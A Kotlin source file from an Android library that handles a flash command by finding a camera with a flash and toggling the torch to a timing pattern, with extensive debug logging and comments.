package com.hawkshaw.library.features.misc

import android.content.Context
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraManager
import android.util.Log // Added for logging
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

private const val TAG = "Flash"

/**
 * Control device flashlight based on request parameters
 *
 * @param context Application context
 * @param request Flash request parameters
 */
fun flash(context: Context, request: Command.FlashRequest) {
    Log.d(TAG, "[DEBUG] flash called with context: $context, request: $request")
    CoroutineScope(Dispatchers.IO).launch {
        Log.d(TAG, "[DEBUG] Coroutine for flash operation started on Dispatchers.IO.")
        try {
            // Determine which camera to use (front or back)
            val lensFacing = when (request.facing) {
                Command.FlashRequest.Facing.Front -> CameraCharacteristics.LENS_FACING_FRONT
                else -> CameraCharacteristics.LENS_FACING_BACK
            }
            Log.d(TAG, "[DEBUG] Desired lens facing: ${if (lensFacing == CameraCharacteristics.LENS_FACING_FRONT) "FRONT" else "BACK"}")

            // Get camera service
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            Log.d(TAG, "[DEBUG] CameraManager obtained: $cameraManager")
            val cameraIdList = cameraManager.cameraIdList
            Log.d(TAG, "[DEBUG] CameraIdList: ${cameraIdList.joinToString()}")

            // Find camera with flash capability
            var cameraFound = false
            for (cameraId in cameraIdList) {
                Log.d(TAG, "[DEBUG] Checking cameraId: $cameraId")
                val characteristics = cameraManager.getCameraCharacteristics(cameraId)
                val cameraLensFacing = characteristics.get(CameraCharacteristics.LENS_FACING)
                Log.d(TAG, "[DEBUG] CameraId $cameraId - Lens Facing: $cameraLensFacing")

                // Check if this camera matches our desired facing direction
                if (cameraLensFacing != lensFacing) {
                    Log.d(TAG, "[DEBUG] CameraId $cameraId - Lens facing does not match. Skipping.")
                    continue
                }

                // Check if flash is available
                val flashAvailable = characteristics.get(CameraCharacteristics.FLASH_INFO_AVAILABLE)
                Log.d(TAG, "[DEBUG] CameraId $cameraId - Flash Available: $flashAvailable")
                if (flashAvailable != true) {
                    Log.d(TAG, "[DEBUG] CameraId $cameraId - Flash not available. Current characteristics: $characteristics")
                    // Existing Logger.e is good, this log shows we reached this point before it.
                    Logger.e(
                        TAG,
                        "Flash: Selected camera ($cameraId) does not have any flash!",
                        b = false,
                        i = 12,
                        nothing = null
                    )
                    // Continue to check other cameras if this one doesn't have a flash
                    // but matches the facing direction. If no other camera is found,
                    // the function will exit the loop and the launch scope.
                    // If this is the *only* camera that matches facing, and it has no flash,
                    // it will effectively do nothing, which is logged by the Logger.e.
                    // To ensure we don't proceed with a camera without flash, we can return here if it's critical.
                    // However, the original code continues, so let's maintain that behavior.
                    // For clarity, let's explicitly note if we are continuing the search.
                     Log.d(TAG, "[DEBUG] CameraId $cameraId - Continuing to check other cameras as this one has no flash.")
                    continue // Ensure we check other cameras
                }
                cameraFound = true
                Log.d(TAG, "[DEBUG] CameraId $cameraId - Suitable camera found with flash.")
                // Existing Logger.v is good for this.
                Logger.v(TAG, "Flash: Starting flash for cameraId $cameraId", false, 4, null)

                // Get timing pattern for flash
                val timings = request.timings
                var counter = 0
                Log.d(TAG, "[DEBUG] Flash timings: ${timings.joinToString()}")

                // Flash according to timing pattern
                for (time in timings) {
                    val isFlashOn = (counter % 2) == 1 // Corrected logic: 0=off, 1=on, 2=off, 3=on ... assumes first timing is 'off' duration
                    Log.d(TAG, "[DEBUG] Flash cycle $counter: isFlashOn=$isFlashOn, duration=${time}ms")
                    try {
                        Log.d(TAG, "[DEBUG] Setting torch mode for $cameraId to $isFlashOn")
                        cameraManager.setTorchMode(cameraId, isFlashOn)
                        Log.d(TAG, "[DEBUG] Torch mode set. Delaying for ${time}ms.")
                        delay(time)
                    } catch (e: Exception) {
                        Log.e(TAG, "[DEBUG] Error during setTorchMode or delay for $cameraId", e)
                        Logger.e(TAG, "Flash: Error setting torch mode or delaying for $cameraId: ${e.message}", e, false, 12, null)
                        // If an error occurs here, ensure flash is turned off before exiting this camera's attempt
                        try {
                            cameraManager.setTorchMode(cameraId, false)
                            Log.d(TAG, "[DEBUG] Ensured flash is off for $cameraId after error during cycle.")
                        } catch (turnOffError: Exception) {
                            Log.e(TAG, "[DEBUG] Error ensuring flash off for $cameraId after cycle error", turnOffError)
                        }
                        return@launch // Exit coroutine if there's an error in the loop
                    }
                    counter++
                }

                // Make sure flash is turned off when done
                Log.d(TAG, "[DEBUG] Flash cycles complete. Turning off flash for $cameraId.")
                cameraManager.setTorchMode(cameraId, false)
                // Existing Logger.v is good for this.
                Logger.v(TAG, "Flash: Turning off flash for $cameraId", false, 4, null)

                Log.d(TAG, "[DEBUG] Flash operation completed successfully for $cameraId. Exiting coroutine.")
                return@launch // Successfully processed one camera, exit.
            }

            if (!cameraFound) {
                 Log.w(TAG, "[DEBUG] No suitable camera with flash found for the requested facing direction.")
                 // Logger.e already covers "Selected camera does not have any flash!" if a camera was selected but had no flash.
                 // This new log covers the case where no camera even matched the facing + flash criteria.
            }

        } catch (e: Exception) {
            // Existing Logger.e is good for the generic error.
            Log.e(TAG, "[DEBUG] Flash error in outer try-catch: ${e.message}", e)
            Logger.e(TAG, "Flash error: ${e.message}", e, false, 12, null)
        }
        Log.d(TAG, "[DEBUG] Coroutine for flash operation finished.")
    }
}

